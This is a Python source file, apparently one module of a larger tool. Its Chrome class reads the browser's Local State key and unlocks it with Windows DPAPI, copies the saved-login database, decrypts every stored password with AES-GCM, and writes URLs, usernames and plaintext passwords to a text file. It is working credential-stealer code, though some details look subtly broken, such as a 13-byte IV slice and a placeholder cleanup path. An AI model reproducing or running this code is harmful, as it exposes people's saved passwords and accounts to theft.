from json import loads
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from shutil import copy2
from os import environ, remove
from pathlib import Path
from utils.config import CHROME_APPDATA_PATH, LOCAL_STATE_CHROME, LOGIN_DB_CHROME

class Chrome():
    def __init__(self) -> None:
        self.appdata_path = CHROME_APPDATA_PATH

    def _is_path_exists(self):
        return self.appdata_path.exists()

    def get_master_key():
        with open(LOCAL_STATE_CHROME, 'r', encoding='utf-8') as local_state_mutex:
            local_state = local_state_mutex.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key
    
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:16]
            payload = buff[16:]
            cipher = Chrome.generate_cipher(master_key, iv)
            decrypted_pass = Chrome.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Chrome < v80"
        
    # def decrypt_password(buffer, master_key):
    #     try:
    #         master_key = unhexlify(str(Chrome.get_master_key().hex()))
    #         encrypted_password = unhexlify(str(buffer.hex()))
    #         nonce, tag = buffer[:12], buffer[-16:]
    #         cipher = Chrome.generate_cipher(master_key, nonce)
    #         decrypted_password = cipher.decrypt_and_verify(encrypted_password[12:-16], tag)

    #         return decrypted_password
    #     except Exception:
    #         pass

    def extract_saved_credentials(self):
        """
        Locate the local state file and login db file of chrome
        """
        query_results = "chrome_results.txt"
        temp_db = "TempLogin.db"
        
        if self._is_path_exists():
            copy2(LOGIN_DB_CHROME, temp_db)
        
        conn = connect(temp_db)
        cursor = conn.cursor()
        master_key = Chrome.get_master_key()

        try:
            query = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(query)
            for result in cursor.fetchall():
                url = result[0]
                username = result[1]
                encrypted_password = result[2]
                decrypted_password = Chrome.decrypt_password(encrypted_password, master_key)
                Chrome.write_result(query_results, f'URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n')
            
            return query_results
        except Exception:
            pass

        cursor.close()
        conn.close()
        
        try:
            temp_db_path = "path_to_store_copied_chrome_login_db"
            remove(temp_db_path)
        except Exception:
            pass

    def write_result(result_file, buffer):
        with open(result_file, "a") as chrome_credentials_mutex:
            chrome_credentials_mutex.writelines(buffer)
